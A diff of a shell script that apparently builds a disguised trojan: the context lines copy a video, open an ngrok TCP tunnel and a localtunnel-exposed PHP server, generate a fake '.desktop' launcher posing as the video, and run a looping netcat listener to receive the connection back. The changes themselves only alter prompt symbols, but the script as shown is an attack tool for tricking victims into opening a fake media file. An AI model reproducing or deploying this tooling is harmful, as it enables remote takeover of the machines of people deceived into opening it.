@@ -9,23 +9,23 @@ ctrl_c(){ killps;}
 
 printf "$G(_>)_Set_video$W\n"
 while read -p " ╰───➤ " realVID  && [ -z $realVID ] || [ ! -e $realVID ];do
-	printf "$R(_>)─➤$W Not such file $R|$W Try again.\n"
+	printf "$R(_➤)$W Not such file $R|$W Try again.\n"
 done
 cp $realVID $TMPDIR
 fakeVID=$(ls $realVID|awk -F '/' '{print $NF}')_vid
 
-printf "$G(_>)─➤$W running ngrok server"
+printf "$G(_➤)$W running ngrok server"
 exec ngrok -tcp 4546 >/dev/null >2/dev/null &
 sleep 15
 revHOST=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f1)
 revPORT=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
-[[ -z $revHOST ]] && { printf >&2 "$R\n(_>)─➤ ERROR :$W ngrok tunnel failed\n";exit;}
+[[ -z $revHOST ]] && { printf >&2 "$R\n(_➤) ERROR :$W ngrok tunnel failed\n";exit;}
 
-printf "$G(_>)─➤$W running php server over tun0."
+printf "$G(_➤)$W running php server over tun0."
 exec lt -h "http://localtunnel.me" -p 4545 -s mis-videos >/dev/null 2>/dev/null &
 exec php -S 127.0.0.1:4545 -t $TMPDIR
 
-printf "$G(_>)─➤$W creating fake video."
+printf "$G(_➤)$W creating fake video."
 cat <<- CONF > $iHAKLAB/$fakeVID.desktop
 #!/usr/bin/env xdg-open
 
@@ -39,7 +39,7 @@ Icon=video-x-generic
 CONF
 printf "$G ╰─DONE──➤$W $iHAKLAB/$fakeVID.desktop"
 
-printf "$G(_>)─➤$W running netcat."
+printf "$G(_➤)$W running netcat."
 while true;do
 	nc -nvlp 4546
 done
